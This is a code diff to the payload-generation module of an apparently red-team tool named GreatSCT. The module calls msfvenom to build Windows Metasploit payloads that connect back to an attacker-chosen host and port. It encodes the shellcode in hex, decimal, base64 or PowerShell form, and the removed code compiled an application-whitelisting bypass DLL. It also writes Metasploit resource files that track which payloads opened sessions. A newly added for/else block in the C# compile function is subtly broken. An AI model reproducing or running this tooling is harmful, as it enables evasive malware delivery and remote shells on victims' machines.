@@ -10,10 +10,17 @@ import random
 This module is used for payload generation and operations.
 """
 
-class Generator():
+class Generator:
     """
     This class is used for payload generation and operations.
     """
+
+    verbose = False
+
+    def __init__(self, verbose=False):
+
+        Generator.verbose = verbose
+
     def genShellcode(self, host, port, arch, name, payload, shellProcess=None):
         """
         Generates shellcode with msfvenom.
@@ -49,29 +56,25 @@ class Generator():
             form = "psh"
 
         if (arch == "x86"):
+            self.verbose_prompt("msfvenom -a x86 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}> /tmp/metasploit 2> /dev/null".format(payload, uuid, host, port, form)    )
             os.system("msfvenom -a x86 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}\
              > /tmp/metasploit 2> /dev/null".format(payload, uuid, host, port, form))
             self.genMetasploitReourceFile(host, port, payload)
             self.genAnalystCSVFile(name, uuid)
         else:
+            self.verbose_prompt("msfvenom -a x64 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}> /tmp/metasploit 2> /dev/null".format(payload.replace("windows/", "windows/x64/"), uuid, host, port, form))
             os.system("msfvenom -a x64 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}\
              > /tmp/metasploit 2> /dev/null".format(payload.replace("windows/", "windows/x64/"), uuid, host, port, form))
             self.genMetasploitReourceFile(host, port, payload)
             self.genAnalystCSVFile(name, uuid)
+
         with open("/tmp/metasploit", 'rb') as f:
             code = f.read()
 
-        os.system('rm /tmp/metasploit')
-        shellcode = str(code)
-
-        if shellProcess == 'hexEncode':
-            shellcode = self.hexEncode(shellcode)
-        elif shellProcess == 'decEncode':
-            shellcode = self.decEncode(shellcode)
-        elif shellProcess == 'b64Encode':
-            shellcode = self.b64Encode(shellcode)
-        elif shellProcess == 'pshEncode':
-            shellcode = self.pshEncode(shellcode)
+        self.verbose_prompt("code: {0}".format(code))
+        shellcode = self.encodeShellcode(code, shellProcess)
+        # os.system("rm /tmp/metasploit")
+        self.verbose_prompt("shellcode: {0}".format(shellcode))
 
         return shellcode
 
@@ -86,8 +89,9 @@ class Generator():
         :returns: shellcode
         :rtype: string
         """
+        self.verbose_prompt("encoding")
         if shellProcess == 'hexEncode':
-            shellcode = self.hexEncode(shellcode)
+            shellcode = self.hexEncode("{0}".format(shellcode))
         elif shellProcess == 'decEncode':
             shellcode = self.decEncode(shellcode)
         elif shellProcess == 'b64Encode':
@@ -123,10 +127,10 @@ class Generator():
         :returns: shellcode
         :rtype: string
         """
-        shellcode = str(base64.b64encode(shellcode.encode('utf-8')))
-        shellcode = shellcode[2:-1]
+        shellcode = base64.b64encode(shellcode)
+        self.verbose_prompt("b64Encode: {0}".format(shellcode))
 
-        return shellcode
+        return shellcode.decode()
 
     def decEncode(self, shellcode):
         """
@@ -184,28 +188,22 @@ class Generator():
             f.write("start {0}\n".format(run_info))
             f.write('timeout 30 > NUL\n')
 
-    def compileAllTheThings(self, name):
+    def genCSharpExe(self, steps):
         """
-        Compiles AllTheThings DLL 5 in 1 AWL on Linux.
+        Compiles C# payloads on Linux with mono-csc
 
-        :param name: name of the payload
-        :type name: string
+        :param steps: commands to compile the payload
+        :type list: list of commands
         """
 
-        build_steps = [
-            "apt-get install mono-complete -y",
-            "git clone https://github.com/ConsciousHacker/AllTheThings",
-            "wget https://github.com/mono/nuget-binary/raw/master/nuget.exe -O nuget.exe",
-            "cp {0} ./AllTheThings/AllTheThings/Program.cs".format(name),
-            "rm ./AllTheThings/AllTheThings/bin/Release/AllTheThings.dll >/dev/null",
-            "mono --runtime=v4.0 nuget.exe restore ./AllTheThings/AllTheThings.sln",
-            "mdtool build '--configuration:Release' ./AllTheThings/AllTheThings/AllTheThings.csproj",
-            "cp ./AllTheThings/AllTheThings/bin/Release/AllTheThings.dll {0}".format(
-                name.replace('.cs', '.dll'))
-        ]
+        os.system("apt-get install mono-devel mono-complete -y >/dev/null 2>&1")
 
-        for step in build_steps:
-            os.system("{0} >/dev/null 2>&1".format(step))
+        if self.verbose:
+            for step in steps:
+                self.verbose_prompt(step)
+                os.system("{0}".format(step))
+            else:
+                os.system("echo VERBOSE: ;{0} >/dev/null 2>&1".format(step))
 
     def genMetasploitReourceFile(self, host, port, payload):
         """
@@ -243,19 +241,22 @@ run -j'''.format(host, port, payload, os.getcwd())
         It works by checking if the UUID has changed into Metasploit and then
         searches for the entry in anaylst.csv and marks the column TRUE.
         """
-        msfrc = '''if session.payload_uuid.respond_to?(:puid_hex) && uuid_info = framework.uuid_db[session.payload_uuid.puid_hex]
+        msfrc = '''<ruby>
+    if session.payload_uuid.respond_to?(:puid_hex) && uuid_info = framework.uuid_db[session.payload_uuid.puid_hex]
 
-    f = open("./GenerateAll/analyst.csv", "r")
-    text = f.read
-    f.close
+        f = open("/var/www/html/GenerateAll/analyst.csv", "r")
+        text = f.read
+        f.close
 
-    if text.include? name = uuid_info["datastore"]["PayloadUUIDName"].to_s
-        puts "GreatSCT: Marking " + name + " as successful in ./GenerateAll/analysts.csv"
-        new_success = text.gsub(uuid_info["datastore"]["PayloadUUIDName"].to_s + ",FALSE", uuid_info["datastore"]["PayloadUUIDName"].to_s + ",TRUE")
-        open("./GenerateAll/analyst.csv", "w") {|file| file.puts new_success}
+        if text.include? name = uuid_info["datastore"]["PayloadUUIDName"].to_s
+            puts "GreatSCT: Marking " + name + " as successful in /var/www/html/GenerateAll/analysts.csv"
+            new_success = text.gsub(uuid_info["datastore"]["PayloadUUIDName"].to_s + ",FALSE", uuid_info["datastore"]["PayloadUUIDName"].to_s + ",TRUE")
+            open("/var/www/html/GenerateAll/analyst.csv", "w") {|file| file.puts new_success}
+        end
+
     end
-
-end'''
+</ruby>
+'''
         with open('./GenerateAll/payloadtracker.rc', 'w+') as f:
             f.write(msfrc)
 
@@ -294,3 +295,7 @@ end'''
         uuid = ''.join(random.choice(chars) for _ in range(size))
 
         return uuid
+
+    def verbose_prompt(self, item):
+        if self.verbose:
+            print("VERBOSE: {0}".format(item))
